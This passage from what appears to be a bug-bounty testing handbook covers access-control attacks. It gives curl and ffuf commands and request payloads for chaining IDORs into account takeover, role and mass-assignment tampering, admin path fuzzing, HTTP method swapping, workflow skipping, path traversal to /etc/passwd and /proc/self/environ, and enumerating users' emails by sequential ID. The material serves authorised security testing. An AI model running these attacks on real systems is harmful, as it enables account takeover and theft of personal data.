+<td>Export report</td>
+<td><code>account_id</code></td>
+<td>Query param</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>Share file</td>
+<td><code>file_uuid</code></td>
+<td>Request body</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>View audit log</td>
+<td><code>org_id</code></td>
+<td>Header</td>
+<td>✓</td>
+</tr>
+</tbody>
+</table>
+<p>For each row ask: <strong>What object does this operate on? Who is supposed to have access? What happens if I change the reference?</strong></p>
+<hr />
+<h3 id="322-chaining-idors-into-account-takeover">3.2.2 Chaining IDORs into Account Takeover<a class="headerlink" href="#322-chaining-idors-into-account-takeover" title="Permanent link">&para;</a></h3>
+<p>A read IDOR on a user's email is not just information disclosure — it's the first step in an ATO chain. Always ask: <em>What's the worst thing I can do with this IDOR?</em></p>
+<table>
+<thead>
+<tr>
+<th>IDOR Chain</th>
+<th>Steps</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read IDOR on email</td>
+<td>Get victim email → trigger password reset</td>
+<td>ATO</td>
+</tr>
+<tr>
+<td>Read IDOR on reset token</td>
+<td><code>GET /api/users/1043/reset-token</code> → use token</td>
+<td>ATO</td>
+</tr>
+<tr>
+<td>Read IDOR on MFA backup codes</td>
+<td>Get codes → bypass MFA</td>
+<td>ATO</td>
+</tr>
+<tr>
+<td>Write IDOR on email field</td>
+<td>Change victim email to attacker email → reset</td>
+<td>ATO</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash highlight"><span class="filename">idor_chain_example.sh</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Step 1: Read IDOR — get victim&#39;s email</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;attacker&gt;&quot;</span><span class="w"> </span>https://target.com/api/users/1043
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># Returns: {&quot;email&quot;: &quot;victim@target.com&quot;, ...}</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># Step 2: Trigger password reset for victim&#39;s email</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/forgot-password<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;email=victim@target.com&quot;</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c1"># Step 3: If reset token also IDOR-able:</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;attacker&gt;&quot;</span><span class="w"> </span>https://target.com/api/users/1043/reset-token
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="c1"># Returns: {&quot;token&quot;: &quot;abc123&quot;}</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># Step 4: Reset victim&#39;s password</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/reset-password<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;token=abc123&amp;password=attacker_controlled&quot;</span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># Full ATO — report as Critical</span>
+</span></code></pre></div>
+<hr />
+<h2 id="33-vertical-privilege-escalation">3.3 Vertical Privilege Escalation<a class="headerlink" href="#33-vertical-privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>A lower-privileged user performing actions or accessing data reserved for higher-privileged users: user → admin, user → moderator, free → premium.</p>
+<h3 id="331-role-parameter-tampering">3.3.1 Role Parameter Tampering<a class="headerlink" href="#331-role-parameter-tampering" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any registration, profile update, or account settings endpoint. Look for role-like fields in the request body.</p>
+<div class="language-bash highlight"><span class="filename">role_tampering.sh</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Registration with role param</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>POST<span class="w"> </span>/api/register
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="o">{</span><span class="s2">&quot;username&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker&quot;</span>,<span class="w"> </span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;x@x.com&quot;</span>,<span class="w"> </span><span class="s2">&quot;password&quot;</span>:<span class="w"> </span><span class="s2">&quot;x&quot;</span>,<span class="w"> </span><span class="s2">&quot;role&quot;</span>:<span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="o">}</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1">#                                                                  ↑ try &quot;admin&quot;</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># Profile update</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>PUT<span class="w"> </span>/api/users/me
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;x@x.com&quot;</span>,<span class="w"> </span><span class="s2">&quot;role&quot;</span>:<span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="o">}</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="c1">#                      ↑ try &quot;admin&quot;, &quot;moderator&quot;, &quot;staff&quot;</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c1"># Mass assignment — add undocumented fields to any PUT/PATCH</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>PUT<span class="w"> </span>/api/profile<span class="w"> </span><span class="o">{</span><span class="s2">&quot;display_name&quot;</span>:<span class="w"> </span><span class="s2">&quot;John&quot;</span><span class="o">}</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="c1"># Try:</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>PUT<span class="w"> </span>/api/profile<span class="w"> </span><span class="o">{</span><span class="s2">&quot;display_name&quot;</span>:<span class="w"> </span><span class="s2">&quot;John&quot;</span>,<span class="w"> </span><span class="s2">&quot;role&quot;</span>:<span class="w"> </span><span class="s2">&quot;admin&quot;</span>,<span class="w"> </span><span class="s2">&quot;is_admin&quot;</span>:<span class="w"> </span>true,<span class="w"> </span><span class="s2">&quot;plan&quot;</span>:<span class="w"> </span><span class="s2">&quot;enterprise&quot;</span><span class="o">}</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Mass assignment</p>
+<p>Param Miner (BApp) discovers hidden parameters automatically. Also fuzz with SecLists <code>burp-parameter-names.txt</code> via Intruder — add each discovered param to the request body and watch for behavioral changes.</p>
+</div>
+<hr />
+<h3 id="332-admin-endpoint-access-as-regular-user">3.3.2 Admin Endpoint Access as Regular User<a class="headerlink" href="#332-admin-endpoint-access-as-regular-user" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> After httpx triage and recon. The UI hides admin links — the server may not enforce access control on the underlying routes.</p>
+<div class="language-bash highlight"><span class="filename">admin_endpoint_fuzz.sh</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Fuzz for admin paths with regular user session</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target.com/FUZZ<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-w<span class="w"> </span>/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;regular_user_session&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span>-mc<span class="w"> </span><span class="m">200</span>,201,301,302<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">  </span>-o<span class="w"> </span>admin_endpoints.txt
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># API-specific</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target.com/api/FUZZ<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">  </span>-w<span class="w"> </span>/opt/SecLists/Discovery/Web-Content/api-endpoints.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer &lt;regular_user_token&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">  </span>-mc<span class="w"> </span><span class="m">200</span>,201,400<span class="w">  </span><span class="c1"># 400 = endpoint exists but bad request format</span>
+</span></code></pre></div>
+<p><strong>Admin paths frequently missed:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/admin             /administrator      /admin/panel
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>/api/admin/users   /api/admin/config   /api/admin/stats
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>/api/v1/admin/*    /api/internal/*
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>/management        /manage             /console
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>/staff             /superuser
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>/_admin            /_internal          /_debug
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>/api/users?admin=true
+</span></code></pre></div>
+<p><strong>HTTP method swap on 403'd endpoints:</strong></p>
+<div class="language-bash highlight"><span class="filename">method_swap.sh</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nv">BASE</span><span class="o">=</span><span class="s2">&quot;https://target.com/admin/users/delete/1042&quot;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;Cookie: session=&lt;regular_user&gt;&quot;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># If GET returns 403, try:</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w">   </span><span class="s2">&quot;</span><span class="nv">$BASE</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w">    </span><span class="s2">&quot;</span><span class="nv">$BASE</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>curl<span class="w"> </span>-X<span class="w"> </span>DELETE<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$BASE</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>curl<span class="w"> </span>-X<span class="w"> </span>PATCH<span class="w">  </span><span class="s2">&quot;</span><span class="nv">$BASE</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># Different method → different code path → potentially different access check</span>
+</span></code></pre></div>
+<hr />
+<h3 id="333-forced-browsing-and-state-bypass">3.3.3 Forced Browsing and State Bypass<a class="headerlink" href="#333-forced-browsing-and-state-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any multi-step process — onboarding, checkout, identity verification, email confirmation.</p>
+<p>Some steps only check that the previous step was <em>visited</em>, not that it was completed successfully.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Normal checkout flow:
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>  /checkout/step1 (cart) → /checkout/step2 (payment) → /checkout/step3 (confirm)
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Attack:
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>  Skip step2 (payment) → navigate directly to /checkout/step3
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>  → Does the order complete without payment?
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Verification bypass:
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>  POST /api/verify-phone {&quot;code&quot;: &quot;123456&quot;} → fails
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>  Navigate directly to /dashboard
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>  → Does the app require verified phone, or just that the step was visited?
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>Email confirmation bypass:
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>  /verify-email → /set-password → /complete-profile → /dashboard
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>  → Skip directly to /dashboard without confirming email
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>  → Does the app grant access with unverified email?
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">These are often business logic bugs, not just access control</p>
+<p>Skipping a payment step is a Critical business logic finding regardless of whether it also constitutes an access control failure. Report the most impactful framing.</p>
+</div>
+<hr />
+<h2 id="34-indirect-object-references">3.4 Indirect Object References<a class="headerlink" href="#34-indirect-object-references" title="Permanent link">&para;</a></h2>
+<h3 id="341-email-and-username-as-references">3.4.1 Email and Username as References<a class="headerlink" href="#341-email-and-username-as-references" title="Permanent link">&para;</a></h3>
+<p><strong>These are IDORs too — just less obvious.</strong></p>
+<div class="language-bash highlight"><span class="filename">indirect_reference_tests.sh</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Password reset with email parameter</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>POST<span class="w"> </span>/api/password-reset<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker@x.com&quot;</span><span class="o">}</span><span class="w">   </span><span class="c1"># normal</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>POST<span class="w"> </span>/api/password-reset<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;victim@target.com&quot;</span><span class="o">}</span><span class="w"> </span><span class="c1"># sends reset to victim</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># Notification/unsubscribe via email</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>GET<span class="w"> </span>/api/unsubscribe?email<span class="o">=</span>attacker@x.com<span class="w">    </span><span class="c1"># your own</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>GET<span class="w"> </span>/api/unsubscribe?email<span class="o">=</span>victim@target.com<span class="w"> </span><span class="c1"># disrupts victim&#39;s account</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c1"># Profile lookup via username</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>GET<span class="w"> </span>/api/profile?username<span class="o">=</span>attacker<span class="w">  </span><span class="c1"># your profile</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>GET<span class="w"> </span>/api/profile?username<span class="o">=</span>admin<span class="w">     </span><span class="c1"># admin&#39;s profile data</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="c1"># Messaging — can you send as another user?</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>POST<span class="w"> </span>/api/message<span class="w"> </span><span class="o">{</span><span class="s2">&quot;to&quot;</span>:<span class="w"> </span><span class="s2">&quot;john.doe&quot;</span>,<span class="w"> </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker&quot;</span><span class="o">}</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="c1"># Try changing &quot;from&quot; to another user&#39;s handle</span>
+</span></code></pre></div>
+<hr />
+<h3 id="342-filename-as-reference-path-traversal-variant">3.4.2 Filename as Reference (Path Traversal Variant)<a class="headerlink" href="#342-filename-as-reference-path-traversal-variant" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any file download, export, or template endpoint where a filename is passed in the request.</p>
+<div class="language-bash highlight"><span class="filename">filename_traversal.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Base request</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>GET<span class="w"> </span>/api/files/download?name<span class="o">=</span>myreport.pdf
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># Path traversal attempts</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>GET<span class="w"> </span>/api/files/download?name<span class="o">=</span>../myreport.pdf
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>GET<span class="w"> </span>/api/files/download?name<span class="o">=</span>../../etc/passwd
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>GET<span class="w"> </span>/api/files/download?name<span class="o">=</span>../users/admin/private.pdf
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>GET<span class="w"> </span>/api/files/download?name<span class="o">=</span>..%2Fusers%2Fadmin%2Fprivate.pdf
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="c1"># Template injection variant</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>POST<span class="w"> </span>/api/export<span class="w"> </span><span class="o">{</span><span class="s2">&quot;template&quot;</span>:<span class="w"> </span><span class="s2">&quot;invoice.html&quot;</span><span class="o">}</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>POST<span class="w"> </span>/api/export<span class="w"> </span><span class="o">{</span><span class="s2">&quot;template&quot;</span>:<span class="w"> </span><span class="s2">&quot;../../../etc/passwd&quot;</span><span class="o">}</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>POST<span class="w"> </span>/api/export<span class="w"> </span><span class="o">{</span><span class="s2">&quot;template&quot;</span>:<span class="w"> </span><span class="s2">&quot;../../../../proc/self/environ&quot;</span><span class="o">}</span>
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">See also</p>
+<p>Section 5.4 (Local File Inclusion / Path Traversal) covers this attack class in full depth, including filter bypass techniques and useful file targets.</p>
+</div>
+<hr />
+<h2 id="35-idor-impact-escalation">3.5 IDOR Impact Escalation<a class="headerlink" href="#35-idor-impact-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="351-severity-framework">3.5.1 Severity Framework<a class="headerlink" href="#351-severity-framework" title="Permanent link">&para;</a></h3>
+<p>The severity of an IDOR is determined by what it exposes or enables — not by the fact that it exists.</p>
+<table>
+<thead>
+<tr>
+<th>IDOR Type</th>
+<th>Example Impact</th>
+<th>Typical Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read — public data</td>
+<td>Other user's display name</td>
+<td>Informational / Low</td>
+</tr>
+<tr>
+<td>Read — PII</td>
+<td>Email, phone, address, DOB</td>
+<td>Medium – High</td>
+</tr>
+<tr>
+<td>Read — sensitive data</td>
+<td>Payment cards, SSN, medical records</td>
+<td>High – Critical</td>
+</tr>
+<tr>
+<td>Read — credentials/tokens</td>
+<td>Password reset token, API key</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>Write — own data modified</td>
+<td>Change your own plan or role</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Write — other user's data</td>
+<td>Change victim's email or password</td>
+<td>High – Critical</td>
+</tr>
+<tr>
+<td>Delete — other user's objects</td>
+<td>Delete victim's files or account</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Action — on behalf of user</td>
+<td>Post as victim, transfer funds</td>
+<td>Critical</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Mass IDOR — when one bug affects every user:</strong></p>
+<div class="language-bash highlight"><span class="filename">mass_idor_probe.sh</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Test sequential IDs across a range</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="k">for</span><span class="w"> </span>id<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">100</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">  </span><span class="nv">code</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>-o<span class="w"> </span>/tmp/resp.txt<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code}&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;attacker&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">    </span><span class="s2">&quot;https://target.com/api/users/</span><span class="nv">$id</span><span class="s2">/export&quot;</span><span class="k">)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">  </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$code</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;200&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$id</span><span class="s2">: </span><span class="k">$(</span>cat<span class="w"> </span>/tmp/resp.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.email&#39;</span><span class="k">)</span><span class="s2">&quot;</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="k">done</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># If all 100 return different users&#39; PII → mass data exposure</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="c1"># Report as Critical: &quot;Full user database enumerable via IDOR&quot;</span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="c1"># Include estimated user count in impact statement</span>
+</span></code></pre></div>
+<hr />
